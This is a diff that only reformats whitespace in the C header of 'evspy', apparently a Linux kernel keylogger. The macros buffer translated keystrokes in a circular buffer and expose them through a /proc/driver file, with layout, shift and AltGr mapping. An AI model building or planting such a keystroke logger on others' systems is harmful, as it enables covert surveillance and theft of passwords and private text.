@@ -38,78 +38,78 @@
 #include "kmap/kmap.h"
 
 // Keyboard layouts
-#define EVS_KLAY_EN		0
-#define EVS_KLAY_ES		1
+#define EVS_KLAY_EN     0
+#define EVS_KLAY_ES     1
 
-#define EVS_NAME		"evspy"			// driver name
-#define EVS_KLAY		EVS_KLAY_ES		// change this to your keyboard layout
-#define EVS_TROLL		1				// clear this if you're a serious guy
-#define EVS_BUFSIZE		(1<<15) // 32K	// size of the circular buffer
-#define EVS_PROCNAME	"driver/" EVS_NAME	// virtual file within /proc
+#define EVS_NAME        "evspy"            // driver name
+#define EVS_KLAY        EVS_KLAY_ES        // change this to your keyboard layout
+#define EVS_TROLL       1                  // clear this if you're a serious guy
+#define EVS_BUFSIZE     (1<<15)            // 32K  // size of the circular buffer
+#define EVS_PROCNAME    ("driver/" EVS_NAME) // virtual file within /proc
 
 #include "maps/maps.h"
 
 // Event values
-#define	EVS_VAL_FREE		0
-#define	EVS_VAL_PRESS		1
-#define	EVS_VAL_HOLD		2
+#define EVS_VAL_FREE    0
+#define EVS_VAL_PRESS   1
+#define EVS_VAL_HOLD    2
 
 #define is_ascii(c) (map[c] >= 'a' && map[c] <= 'z')
 
 /*
  * Insert character c into the circular buffer pointed by fifop
  */
-#define evs_insert(fifop, c)		\
-({		\
-	if (kfifo_is_full(fifop))		\
-		kfifo_skip(fifop);		\
-	kfifo_put((fifop), c);		\
-})
+#define evs_insert(fifop, c)      \
+    ({                            \
+        if (kfifo_is_full(fifop)) \
+            kfifo_skip(fifop);    \
+        kfifo_put((fifop), c);    \
+    })
 
 /*
  * Is the c event code associated to any of the FX buttons?
  */
-#define evs_isfX(c)		\
-({		\
-	((c) >= KEY_F1 && (c) <= KEY_F10) ||		\
-	((c) == KEY_F11 || (c) == KEY_F12) ||		\
-	((c) >= KEY_F13 && (c) <= KEY_F24);		\
-})
+#define evs_isfX(c)                               \
+    ({                                            \
+        ((c) >= KEY_F1 && (c) <= KEY_F10) ||      \
+            ((c) == KEY_F11 || (c) == KEY_F12) || \
+            ((c) >= KEY_F13 && (c) <= KEY_F24);   \
+    })
 
 /*
  * Returns the character associated with event code c when shift is pressed
  */
-#define evs_shift(c)		\
-({		\
-	void *__vp;		\
-	char __c;		\
-	if ((shift_on != capslock_on) && is_ascii(c)) {		\
-		__c = map[c] + ('A'-'a');		\
-	} else if (is_ascii(c) || !shift_on) {		\
-		__c = map[c];		\
-	} else {		\
-		if ((__vp = kmap_get(skm, (c))))		\
-			__c = *(char *)__vp;		\
-		else		\
-			__c = map[c];		\
-	}		\
-	&__c;		\
-})
+#define evs_shift(c)                                    \
+    ({                                                  \
+        void *__vp;                                     \
+        char __c;                                       \
+        if ((shift_on != capslock_on) && is_ascii(c)) { \
+            __c = map[c] + ('A'-'a');                   \
+        } else if (is_ascii(c) || !shift_on) {          \
+            __c = map[c];                               \
+        } else {                                        \
+            if ((__vp = kmap_get(skm, (c))))            \
+                __c = *(char *)__vp;                    \
+            else                                        \
+                __c = map[c];                           \
+        }                                               \
+        &__c;                                           \
+    })
 
 /*
  * Returns the character associated with event code c when altgr is pressed
  */
 #ifdef EVS_ALTGR_ENABLED
-#define evs_altgr(c)		\
-({		\
-	void *__vp;		\
-	char __c;		\
-	__vp = kmap_get(akm, (c));		\
-	if (__vp) __c = *(char *)__vp;		\
-	else __c = map[c];		\
-	&__c;		\
-})
+#define evs_altgr(c)                   \
+    ({                                 \
+        void *__vp;                    \
+        char __c;                      \
+        __vp = kmap_get(akm, (c));     \
+        if (__vp) __c = *(char *)__vp; \
+        else __c = map[c];             \
+        &__c;                          \
+    })
 #endif
 
 
-#endif		/* _EVSPY_H */
+#endif /* _EVSPY_H */
